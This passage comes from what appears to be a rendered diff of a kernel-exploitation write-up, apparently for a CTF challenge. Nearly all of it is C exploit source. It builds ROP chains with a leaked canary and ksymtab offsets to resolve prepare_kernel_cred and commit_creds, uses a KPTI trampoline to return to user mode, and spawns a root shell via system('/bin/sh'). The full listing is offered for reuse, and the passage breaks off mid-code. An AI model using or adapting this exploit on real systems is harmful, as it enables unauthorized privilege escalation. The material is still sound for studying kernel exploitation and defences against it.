+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">get_addr</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x150</span><span class="p">];</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;\x00&#39;</span><span class="p">,</span> <span class="mh">0x150</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ropchain</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">gadget2</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ksymtab_prepare_kernel_cred</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">gadget3</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_gadget</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">leak1</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">cs</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">eflags</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">rsp</span><span class="p">;</span>
+    <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">ss</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Never reach! try to read from kernel, return %ld </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x150</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">leak1</span><span class="p">(){</span>
+         <span class="n">__asm__</span><span class="p">(</span>
+                <span class="s">&#34;mov tmp_store, rax;&#34;</span>
+        <span class="p">);</span>
+        <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="n">ksymtab_prepare_kernel_cred</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">tmp_store</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] prepare_kernel_cred: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">prepare_kernel_cred</span><span class="p">);</span>
+        <span class="n">get_addr2</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The rest is the same, here is the full exploits.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define KERNCALL __attribute__((regparm(3)))
+</span><span class="cp"></span>
+<span class="kt">void</span><span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">prepare_kernel_cred</span><span class="p">)(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="n">KERNCALL</span><span class="p">;</span>
+<span class="kt">void</span><span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">commit_creds</span><span class="p">)(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="n">KERNCALL</span><span class="p">;</span>
+
+<span class="k">struct</span> <span class="n">trap_frame</span><span class="p">{</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">rip</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">cs</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">eflags</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">rsp</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">ss</span><span class="p">;</span>
+<span class="p">}</span><span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">));</span>
+<span class="k">struct</span> <span class="n">trap_frame</span> <span class="n">tf</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">tf_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">tf</span><span class="p">;</span>
+
+<span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="n">canary</span><span class="p">;</span>
+<span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="n">base</span><span class="p">;</span>
+<span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="n">gadget1</span><span class="p">;</span>
+<span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="n">gadget2</span><span class="p">;</span>
+<span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="n">gadget3</span><span class="p">;</span>
+<span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="n">ksymtab_commit_creds</span><span class="p">;</span>
+<span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="n">ksymtab_prepare_kernel_cred</span><span class="p">;</span>
+<span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="n">kpti_gadget</span><span class="p">;</span>
+<span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="n">tmp_store</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">init_tf_work</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">__asm__</span> <span class="k">volatile</span><span class="p">(</span><span class="s">&#34;.intel_syntax noprefix;&#34;</span>
+        <span class="s">&#34;mov tf+8, cs;&#34;</span>    <span class="c1">//set cs
+</span><span class="c1"></span>        <span class="s">&#34;pushf;pop tf+16;&#34;</span>       <span class="c1">//set eflags
+</span><span class="c1"></span>        <span class="s">&#34;push rsp;pop tf+24;&#34;</span>
+        <span class="s">&#34;mov tf+32, ss;&#34;</span><span class="p">);</span>
+    <span class="n">tf</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="mh">0x100000</span><span class="p">;</span>
+    <span class="n">tf</span><span class="p">.</span><span class="n">rsp</span> <span class="o">-=</span> <span class="mi">8</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Reg saved cs = %llx, ss = %llx, flags = %llx, user_sp = %llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">tf</span><span class="p">.</span><span class="n">cs</span><span class="p">,</span> <span class="n">tf</span><span class="p">.</span><span class="n">ss</span><span class="p">,</span> <span class="n">tf</span><span class="p">.</span><span class="n">eflags</span><span class="p">,</span> <span class="n">tf</span><span class="p">.</span><span class="n">rsp</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="nf">u64</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">s</span><span class="p">){</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">7</span> <span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span><span class="mi">0</span> <span class="p">;</span><span class="n">i</span><span class="o">--</span><span class="p">){</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mh">0x00000000000000ff</span> <span class="o">&amp;</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">get_shell2</span><span class="p">(){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[!!] your id is %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">getuid</span><span class="p">());</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">get_shell</span><span class="p">(){</span>
+        <span class="n">__asm__</span><span class="p">(</span>
+                <span class="s">&#34;mov tmp_store, rax;&#34;</span>
+               <span class="p">);</span>
+        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x150</span><span class="p">];</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;\x00&#39;</span><span class="p">,</span> <span class="mh">0x150</span><span class="p">);</span>
+        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ropchain</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">gadget1</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp_store</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_gadget</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">get_shell2</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">cs</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">eflags</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">rsp</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">ss</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Never reach! try to write to kernel, return %ld </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x150</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">get_root</span><span class="p">(){</span>
+        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x150</span><span class="p">];</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;\x00&#39;</span><span class="p">,</span> <span class="mh">0x150</span><span class="p">);</span>
+        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ropchain</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">gadget1</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_gadget</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">get_shell</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">cs</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">eflags</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">rsp</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">ss</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Never reach! try to write to kernel, return %ld </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x150</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">leak2</span><span class="p">(){</span>
+        <span class="n">__asm__</span><span class="p">(</span>
+                <span class="s">&#34;mov tmp_store, rax;&#34;</span>
+        <span class="p">);</span>
+        <span class="n">commit_creds</span> <span class="o">=</span> <span class="n">ksymtab_commit_creds</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">tmp_store</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] commit_creds: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">commit_creds</span><span class="p">);</span>
+        <span class="n">get_root</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">get_addr2</span><span class="p">(){</span>
+        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x150</span><span class="p">];</span>
+        <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;\x00&#39;</span><span class="p">,</span> <span class="mh">0x150</span><span class="p">);</span>
+        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ropchain</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="kt">unsigned</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">gadget2</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ksymtab_commit_creds</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">gadget3</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_gadget</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">leak2</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">cs</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">eflags</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">rsp</span><span class="p">;</span>
+        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">ss</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Never reach! try to read from kernel, return %ld </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x150</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">leak1</span><span class="p">(){</span>
+         <span class="n">__asm__</span><span class="p">(</span>
+                <span class="s">&#34;mov tmp_store, rax;&#34;</span>
+        <span class="p">);</span>
+        <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="n">ksymtab_prepare_kernel_cred</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">tmp_store</span><span class="p">;</span>
